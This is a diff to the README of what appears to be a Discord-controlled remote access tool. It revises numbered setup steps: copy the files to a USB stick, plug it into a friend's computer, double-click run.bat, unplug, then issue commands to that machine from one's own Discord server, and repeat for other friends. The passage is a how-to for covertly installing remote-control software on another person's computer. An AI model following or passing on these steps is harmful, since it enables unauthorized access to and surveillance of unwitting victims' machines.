@@ -52,8 +52,9 @@ Target defined in `config.ini`
 9. Save the config.ini
 10. Copy all the files to a Pen USB.
 11. When you are near your friend just plug the Pen USB in his computer and double click on `run.bat`
-11. Wait until the window closes which can take ~30s (there is a small chance that the dependencies are already installed which could reduce the time from ~30s to ~1s) and everything done. Go back to the new server and run a command Target-Command. Ex: Fytex-help
-12. To view more info about each command do Target-help Command. Ex: Fytex-help type
+11. Wait until the window closes which can take ~30s (there is a small chance that the dependencies are already installed which could reduce the time from ~30s to ~1s) and everything done. Wait 2s and unplug the Pen USB. 
+12. Go back to your computer/mobile and in your discord server which has the bot you should be able to run any command Target-Command. Ex: Fytex-help
+13. To view more info about each command do Target-help Command. Ex: Fytex-help type
 
 
 If you want to put this program into another friend's computer just change the TARGET field to your new friend's name in the `config.ini` of your Pen USB. And repeat the process from 10 onwards.
